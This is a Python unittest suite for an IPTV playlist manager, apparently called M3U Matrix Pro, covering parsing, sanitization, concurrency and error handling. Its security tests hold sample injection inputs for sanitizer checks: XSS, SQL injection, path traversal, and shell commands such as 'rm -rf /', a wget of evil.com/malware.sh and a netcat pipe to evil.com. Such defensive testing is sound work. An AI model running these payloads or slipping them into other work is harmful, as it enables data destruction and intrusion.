#!/usr/bin/env python3
"""
Comprehensive Test Suite for M3U Matrix Pro
Tests edge cases, error handling, and performance scenarios
"""

import unittest
import tempfile
import os
import json
import time
import threading
from pathlib import Path
from unittest.mock import patch, Mock, MagicMock
import sys

# Add project to path
sys.path.insert(0, str(Path(__file__).resolve().parent))


class TestM3UMatrixComprehensive(unittest.TestCase):
    """Comprehensive test suite covering edge cases and error scenarios"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.temp_dir = tempfile.mkdtemp()
        self.test_file = Path(self.temp_dir) / "test.m3u"
        
    def tearDown(self):
        """Clean up test files"""
        import shutil
        if Path(self.temp_dir).exists():
            shutil.rmtree(self.temp_dir)

    # ========== SPECIAL CHARACTER TESTS ==========
    
    def test_special_characters_in_channel_names(self):
        """Test handling of special characters in channel names"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
                
        matrix = MockMatrix()
        
        # Test various special characters
        test_cases = [
            ("Gideon%27s%20Way", "Gideon's Way"),  # URL encoding
            ("Channel #1 (HD)", "Channel #1 (HD)"),  # Special chars
            ("Спорт ТВ", "Спорт ТВ"),  # Cyrillic
            ("中文频道", "中文频道"),  # Chinese
            ("Canal Español ñ", "Canal Español ñ"),  # Spanish chars
            ("TV & Radio", "TV & Radio"),  # Ampersand
            ("Channel \"News\"", "Channel \"News\""),  # Quotes
        ]
        
        for input_name, expected in test_cases:
            line = f'#EXTINF:-1,{input_name}'
            result = matrix.parse_extinf_line(line)
            self.assertEqual(result['name'], expected, 
                f"Failed for input: {input_name}")
    
    def test_windows_reserved_names(self):
        """Test sanitization of Windows reserved device names"""
        from Core_Modules.page_generator import sanitize_directory_name
        
        reserved_names = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1']
        
        for name in reserved_names:
            sanitized = sanitize_directory_name(name)
            self.assertTrue(sanitized != name, 
                f"Reserved name {name} not sanitized")
            self.assertTrue(len(sanitized) > 0, 
                f"Sanitized name is empty for {name}")
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        from Core_Modules.page_generator import sanitize_directory_name
        
        dangerous_names = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "channel/../../../root",
            "\\\\server\\share",
        ]
        
        for name in dangerous_names:
            sanitized = sanitize_directory_name(name)
            self.assertNotIn("..", sanitized)
            self.assertNotIn("\\\\", sanitized)
            self.assertNotIn("/", sanitized)
    
    # ========== LARGE PLAYLIST TESTS ==========
    
    def test_large_playlist_parsing(self):
        """Test parsing of large playlists (1000+ channels)"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
                self.channels = []
                
        matrix = MockMatrix()
        
        # Generate large M3U content
        m3u_content = "#EXTM3U\n"
        for i in range(1500):
            m3u_content += f'#EXTINF:-1 tvg-id="ch{i}" group-title="Group{i%10}",Channel {i}\n'
            m3u_content += f'http://example.com/stream{i}.m3u8\n'
        
        # Write to file
        self.test_file.write_text(m3u_content)
        
        # Parse and measure time
        start_time = time.time()
        matrix.parse_m3u_file(str(self.test_file))
        parse_time = time.time() - start_time
        
        # Should parse 1500 channels
        self.assertEqual(len(matrix.channels), 1500)
        
        # Should complete within reasonable time (5 seconds)
        self.assertLess(parse_time, 5.0, 
            f"Parsing 1500 channels took {parse_time:.2f}s")
    
    def test_memory_efficient_parsing(self):
        """Test memory-efficient parsing of very large files"""
        import psutil
        import os
        
        # Skip if psutil not available
        try:
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        except:
            self.skipTest("psutil not available for memory testing")
        
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
                self.channels = []
        
        matrix = MockMatrix()
        
        # Generate very large playlist (5000 channels)
        m3u_content = "#EXTM3U\n"
        for i in range(5000):
            m3u_content += f'#EXTINF:-1,Channel {i}\n'
            m3u_content += f'http://example.com/stream{i}.m3u8\n'
        
        self.test_file.write_text(m3u_content)
        matrix.parse_m3u_file(str(self.test_file))
        
        final_memory = process.memory_info().rss / 1024 / 1024  # MB
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (<100MB for 5000 channels)
        self.assertLess(memory_increase, 100, 
            f"Memory increased by {memory_increase:.2f}MB")
    
    # ========== MALFORMED M3U TESTS ==========
    
    def test_malformed_m3u_recovery(self):
        """Test recovery from various malformed M3U formats"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
                self.channels = []
        
        matrix = MockMatrix()
        
        # Various malformed M3U contents
        malformed_cases = [
            # Missing #EXTM3U header
            "#EXTINF:-1,Channel 1\nhttp://stream1.m3u8\n",
            
            # Incomplete EXTINF lines
            "#EXTM3U\n#EXTINF:-1\nhttp://stream1.m3u8\n",
            
            # Missing URLs
            "#EXTM3U\n#EXTINF:-1,Channel 1\n#EXTINF:-1,Channel 2\n",
            
            # Extra whitespace and empty lines
            "#EXTM3U\n\n\n#EXTINF:-1,Channel 1\n\n\nhttp://stream1.m3u8\n\n",
            
            # Mixed valid and invalid
            "#EXTM3U\nGARBAGE LINE\n#EXTINF:-1,Channel 1\nhttp://stream1.m3u8\n",
        ]
        
        for content in malformed_cases:
            self.test_file.write_text(content)
            try:
                matrix.channels = []
                matrix.parse_m3u_file(str(self.test_file))
                # Should not crash
                self.assertIsNotNone(matrix.channels)
            except Exception as e:
                self.fail(f"Failed to handle malformed M3U: {e}")
    
    def test_empty_m3u_file(self):
        """Test handling of empty M3U files"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
                self.channels = []
        
        matrix = MockMatrix()
        
        # Empty file
        self.test_file.write_text("")
        matrix.parse_m3u_file(str(self.test_file))
        self.assertEqual(len(matrix.channels), 0)
        
        # Only header
        self.test_file.write_text("#EXTM3U\n")
        matrix.channels = []
        matrix.parse_m3u_file(str(self.test_file))
        self.assertEqual(len(matrix.channels), 0)
    
    # ========== JSON HANDLING TESTS ==========
    
    def test_corrupted_json_recovery(self):
        """Test recovery from corrupted JSON settings files"""
        settings_file = Path(self.temp_dir) / "settings.json"
        
        # Various corrupted JSON scenarios
        corrupted_jsons = [
            "",  # Empty file
            "{",  # Incomplete JSON
            '{"key": "value"',  # Missing closing brace
            "null",  # Null value
            '{"key": undefined}',  # Invalid JavaScript
            '{"key": "value",}',  # Trailing comma
        ]
        
        for corrupted in corrupted_jsons:
            settings_file.write_text(corrupted)
            
            # Should not crash when loading
            try:
                with open(settings_file, 'r') as f:
                    content = f.read()
                    if content.strip():
                        data = json.loads(content)
                    else:
                        data = {}
            except json.JSONDecodeError:
                data = {}  # Should fallback to empty dict
            
            self.assertIsInstance(data, dict)
    
    def test_unicode_in_json(self):
        """Test handling of Unicode characters in JSON files"""
        settings_file = Path(self.temp_dir) / "settings.json"
        
        test_data = {
            "channels": [
                {"name": "中文频道", "url": "http://chinese.tv"},
                {"name": "Русский канал", "url": "http://russian.tv"},
                {"name": "قناة عربية", "url": "http://arabic.tv"},
                {"name": "한국 채널", "url": "http://korean.tv"},
            ]
        }
        
        # Write and read back
        settings_file.write_text(json.dumps(test_data, ensure_ascii=False))
        
        with open(settings_file, 'r', encoding='utf-8') as f:
            loaded = json.load(f)
        
        self.assertEqual(loaded, test_data)
    
    # ========== NETWORK ERROR TESTS ==========
    
    @patch('requests.head')
    def test_channel_validation_timeout(self, mock_head):
        """Test channel validation with network timeouts"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
        
        matrix = MockMatrix()
        
        # Simulate timeout
        mock_head.side_effect = Exception("Connection timeout")
        
        result = matrix.validate_channel("http://timeout.example.com/stream.m3u8")
        self.assertEqual(result, "broken")
    
    @patch('requests.head')
    def test_channel_validation_404(self, mock_head):
        """Test channel validation with 404 responses"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
        
        matrix = MockMatrix()
        
        # Simulate 404 response
        mock_response = Mock()
        mock_response.status_code = 404
        mock_head.return_value = mock_response
        
        result = matrix.validate_channel("http://notfound.example.com/stream.m3u8")
        self.assertEqual(result, "broken")
    
    # ========== CONCURRENT OPERATIONS TESTS ==========
    
    def test_concurrent_file_generation(self):
        """Test concurrent page generation doesn't cause conflicts"""
        from Core_Modules.page_generator import NexusTVPageGenerator
        
        generator = NexusTVPageGenerator()
        
        # Simple M3U content
        m3u_content = "#EXTM3U\n#EXTINF:-1,Test Channel\nhttp://test.m3u8\n"
        
        results = []
        errors = []
        
        def generate_page(index):
            try:
                output_path = generator.generate_page(
                    m3u_content, 
                    f"concurrent_test_{index}"
                )
                results.append(output_path)
            except Exception as e:
                errors.append(e)
        
        # Launch multiple threads
        threads = []
        for i in range(5):
            t = threading.Thread(target=generate_page, args=(i,))
            threads.append(t)
            t.start()
        
        # Wait for completion
        for t in threads:
            t.join(timeout=10)
        
        # All should succeed
        self.assertEqual(len(errors), 0, f"Errors occurred: {errors}")
        self.assertEqual(len(results), 5)
    
    def test_concurrent_json_access(self):
        """Test concurrent access to JSON settings file"""
        settings_file = Path(self.temp_dir) / "settings.json"
        initial_data = {"counter": 0, "channels": []}
        settings_file.write_text(json.dumps(initial_data))
        
        errors = []
        
        def modify_settings(index):
            try:
                # Read
                with open(settings_file, 'r') as f:
                    data = json.load(f)
                
                # Modify
                data["counter"] += 1
                data["channels"].append(f"Channel {index}")
                
                # Write back
                with open(settings_file, 'w') as f:
                    json.dump(data, f)
            except Exception as e:
                errors.append(e)
        
        # Launch threads
        threads = []
        for i in range(10):
            t = threading.Thread(target=modify_settings, args=(i,))
            threads.append(t)
            t.start()
        
        # Wait for completion
        for t in threads:
            t.join(timeout=5)
        
        # Should handle concurrent access gracefully
        # Some operations may fail due to race conditions, but shouldn't crash
        self.assertLess(len(errors), 5, "Too many concurrent access errors")
    
    # ========== ERROR HANDLING TESTS ==========
    
    def test_disk_full_simulation(self):
        """Test handling of disk full errors"""
        from Core_Modules.page_generator import NexusTVPageGenerator
        
        generator = NexusTVPageGenerator()
        
        # Mock write to raise OSError
        with patch('builtins.open', side_effect=OSError("No space left on device")):
            m3u_content = "#EXTM3U\n#EXTINF:-1,Test\nhttp://test.m3u8\n"
            
            try:
                generator.generate_page(m3u_content, "disk_full_test")
                self.fail("Should have raised an exception")
            except OSError as e:
                self.assertIn("space", str(e).lower())
    
    def test_permission_denied_handling(self):
        """Test handling of permission denied errors"""
        # Create read-only directory
        readonly_dir = Path(self.temp_dir) / "readonly"
        readonly_dir.mkdir()
        
        # Make it read-only (Unix-like systems)
        import stat
        try:
            os.chmod(readonly_dir, stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH)
        except:
            self.skipTest("Cannot set read-only permissions on this system")
        
        from Core_Modules.page_generator import NexusTVPageGenerator
        
        # Try to create file in read-only directory
        try:
            generator = NexusTVPageGenerator()
            generator.output_dir = readonly_dir
            
            m3u_content = "#EXTM3U\n#EXTINF:-1,Test\nhttp://test.m3u8\n"
            generator.generate_page(m3u_content, "permission_test")
            
            # Restore permissions before assertion
            os.chmod(readonly_dir, stat.S_IRWXU)
            self.fail("Should have raised permission error")
        except (PermissionError, OSError):
            # Restore permissions
            os.chmod(readonly_dir, stat.S_IRWXU)
            pass  # Expected
    
    # ========== REGRESSION TESTS ==========
    
    def test_url_encoding_regression(self):
        """Regression test for URL-encoded channel names bug"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
        
        matrix = MockMatrix()
        
        # This was the original bug
        line = '#EXTINF:-1,Gideon%27s%20Way'
        result = matrix.parse_extinf_line(line)
        
        # Should be decoded
        self.assertEqual(result['name'], "Gideon's Way")
        self.assertNotIn("%27", result['name'])
        self.assertNotIn("%20", result['name'])
    
    def test_json_empty_file_regression(self):
        """Regression test for empty JSON file crash"""
        settings_file = Path(self.temp_dir) / "settings.json"
        
        # Create empty file
        settings_file.touch()
        
        # Should not crash when loading
        try:
            with open(settings_file, 'r') as f:
                content = f.read()
                if content.strip():
                    data = json.loads(content)
                else:
                    data = {}  # Default fallback
        except:
            data = {}
        
        self.assertIsInstance(data, dict)
        self.assertEqual(len(data), 0)
    
    # ========== PERFORMANCE TESTS ==========
    
    def test_channel_validation_performance(self):
        """Test performance of channel validation"""
        from Applications.M3U_MATRIX_PRO import M3UMatrix
        
        class MockRoot:
            def after(self, *args): pass
        
        class MockMatrix(M3UMatrix):
            def __init__(self):
                self.root = MockRoot()
        
        matrix = MockMatrix()
        
        # Mock validation to be instant
        with patch.object(matrix, 'validate_channel', return_value='valid'):
            channels = [f"http://example.com/stream{i}.m3u8" for i in range(100)]
            
            start_time = time.time()
            for url in channels:
                matrix.validate_channel(url)
            validation_time = time.time() - start_time
            
            # Should validate 100 channels quickly (<1 second with mocking)
            self.assertLess(validation_time, 1.0)
    
    def test_page_generation_performance(self):
        """Test performance of page generation"""
        from Core_Modules.page_generator import SimplePlayerGenerator
        
        generator = SimplePlayerGenerator()
        
        # Generate M3U with 100 channels
        m3u_content = "#EXTM3U\n"
        for i in range(100):
            m3u_content += f'#EXTINF:-1,Channel {i}\n'
            m3u_content += f'http://example.com/stream{i}.m3u8\n'
        
        start_time = time.time()
        try:
            generator.generate_page(m3u_content, "performance_test")
        except:
            pass  # May fail due to missing template, but we're testing speed
        generation_time = time.time() - start_time
        
        # Should generate quickly (<2 seconds)
        self.assertLess(generation_time, 2.0)


class TestRedisIntegration(unittest.TestCase):
    """Test Redis integration and fallback behavior"""
    
    @patch('redis.Redis')
    def test_redis_connection_failure(self, mock_redis):
        """Test graceful fallback when Redis is unavailable"""
        # Simulate connection failure
        mock_redis.side_effect = Exception("Connection refused")
        
        # App should continue without Redis
        try:
            from redis import Redis
            client = Redis()
            client.ping()
        except:
            # Should fall back gracefully
            client = None
        
        self.assertIsNone(client)
    
    @patch('redis.Redis')
    def test_redis_timeout_handling(self, mock_redis):
        """Test handling of Redis timeout"""
        mock_instance = Mock()
        mock_instance.ping.side_effect = Exception("Timeout")
        mock_redis.return_value = mock_instance
        
        try:
            from redis import Redis
            client = Redis(socket_connect_timeout=1)
            client.ping()
            connected = True
        except:
            connected = False
        
        self.assertFalse(connected)


class TestSecurityFeatures(unittest.TestCase):
    """Test security features and input sanitization"""
    
    def test_xss_prevention_in_channel_names(self):
        """Test XSS prevention in channel names"""
        from Core_Modules.page_generator import clean_title
        
        dangerous_inputs = [
            "<script>alert('XSS')</script>",
            "Channel <img src=x onerror=alert('XSS')>",
            "Channel'); DROP TABLE channels;--",
            "<iframe src='evil.com'></iframe>",
        ]
        
        for dangerous in dangerous_inputs:
            cleaned = clean_title(dangerous)
            # Should not contain script tags or HTML
            self.assertNotIn("<script>", cleaned)
            self.assertNotIn("<img", cleaned)
            self.assertNotIn("<iframe", cleaned)
            self.assertNotIn("onerror", cleaned)
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in inputs"""
        from Core_Modules.page_generator import sanitize_directory_name
        
        sql_injections = [
            "channel'; DROP TABLE users;--",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
        ]
        
        for injection in sql_injections:
            sanitized = sanitize_directory_name(injection)
            # Should not contain SQL keywords
            self.assertNotIn("DROP", sanitized.upper())
            self.assertNotIn("UNION", sanitized.upper())
            self.assertNotIn("SELECT", sanitized.upper())
            self.assertNotIn("'", sanitized)
            self.assertNotIn(";", sanitized)
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks"""
        from Core_Modules.page_generator import sanitize_directory_name
        
        command_injections = [
            "channel; rm -rf /",
            "channel && wget evil.com/malware.sh",
            "channel | nc evil.com 1234",
            "channel`cat /etc/passwd`",
        ]
        
        for injection in command_injections:
            sanitized = sanitize_directory_name(injection)
            # Should not contain shell metacharacters
            self.assertNotIn(";", sanitized)
            self.assertNotIn("&", sanitized)
            self.assertNotIn("|", sanitized)
            self.assertNotIn("`", sanitized)
            self.assertNotIn("$", sanitized)


def run_tests():
    """Run all tests and generate report"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestM3UMatrixComprehensive))
    suite.addTests(loader.loadTestsFromTestCase(TestRedisIntegration))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityFeatures))
    
    # Run tests with detailed output
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Generate report
    print("\n" + "="*70)
    print("TEST SUMMARY")
    print("="*70)
    print(f"Tests Run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped)}")
    print(f"Success Rate: {((result.testsRun - len(result.failures) - len(result.errors)) / result.testsRun * 100):.1f}%")
    
    if result.failures:
        print("\nFAILURES:")
        for test, traceback in result.failures:
            print(f"  - {test}")
    
    if result.errors:
        print("\nERRORS:")
        for test, traceback in result.errors:
            print(f"  - {test}")
    
    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)